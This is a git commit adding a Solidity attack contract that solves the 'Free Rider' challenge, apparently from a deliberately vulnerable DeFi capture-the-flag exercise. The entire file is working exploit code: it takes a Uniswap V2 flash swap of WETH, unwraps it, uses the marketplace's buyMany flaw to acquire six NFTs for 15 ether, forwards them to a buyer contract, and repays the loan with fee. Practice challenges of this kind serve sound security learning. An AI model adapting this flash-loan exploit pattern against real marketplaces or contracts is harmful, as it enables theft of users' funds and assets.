5d536a0bbed316dc758d9235d434598102773a13
ldzoid <lucijandrnasin1@gmail.com>
2023-02-20 16:49:15 +0100

    write solution for free rider challenge

---
+++ contracts/attacker-contracts/FreeRiderAttack.sol
@@ -0,0 +1,110 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "../DamnValuableNFT.sol";
+
+contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
+    using Address for address;
+
+    address payable immutable weth;
+    address immutable dvt;
+    address immutable factory;
+    address payable immutable buyerMarketplace;
+    address immutable buyer;
+    address immutable nft;
+
+    constructor(
+        address payable _weth,
+        address _factory,
+        address _dvt,
+        address payable _buyerMarketplace,
+        address _buyer,
+        address _nft
+    ) {
+        weth = _weth;
+        dvt = _dvt;
+        factory = _factory;
+        buyerMarketplace = _buyerMarketplace;
+        buyer = _buyer;
+        nft = _nft;
+    }
+
+    function flashSwap(address _tokenBorrow, uint256 _amount) external {
+        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
+        require(pair != address(0), "!pair init");
+
+        address token0 = IUniswapV2Pair(pair).token0();
+        address token1 = IUniswapV2Pair(pair).token1();
+
+        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
+        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;
+
+        bytes memory data = abi.encode(_tokenBorrow, _amount);
+
+        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external override {
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        address token1 = IUniswapV2Pair(msg.sender).token1();
+        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
+
+        require(msg.sender == pair, "!pair");
+        require(sender == address(this), "!sender");
+
+        (address tokenBorrow, uint256 amount) = abi.decode(
+            data,
+            (address, uint256)
+        );
+
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+
+        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));
+
+        tokenBorrow.functionCall(
+            abi.encodeWithSignature("withdraw(uint256)", currBal)
+        );
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
+            tokenIds
+        );
+
+        for (uint256 i = 0; i < 6; i++) {
+            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
+        }
+
+        (bool success, ) = weth.call{value: 15.1 ether}("");
+        require(success, "failed to deposit weth");
+
+        IERC20(tokenBorrow).transfer(pair, amountToRepay);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
